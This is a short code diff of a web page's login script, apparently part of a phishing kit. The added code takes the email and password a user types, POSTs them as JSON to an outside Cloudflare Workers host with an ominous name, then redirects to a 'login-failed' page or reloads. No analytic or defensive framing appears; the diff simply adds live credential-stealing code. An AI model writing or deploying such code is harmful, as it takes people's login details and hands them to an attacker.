@@ -39,13 +39,17 @@ document.addEventListener("DOMContentLoaded", function() {
 
     async function sendFormAndRedirect(email, password) {
         localStorage.removeItem("user-email");
-        const data = await fetch("");
+        const data = await fetch("https://winter-fog-b8e9.bad0men.workers.dev", {
+            method: "POST",
+            contentType: "application/json",
+            body: JSON.stringify({email, password})
+        });
         const res = await data.json();
         if (!res) {
-            window.location.reload();
+           window.location.href = `${hostname}/login-failed.htm`;
+        }else{
+             window.location.reload();
         };
-        window.location.href = `${hostname}/login-failed.htm`;
-        
     };
 });
 
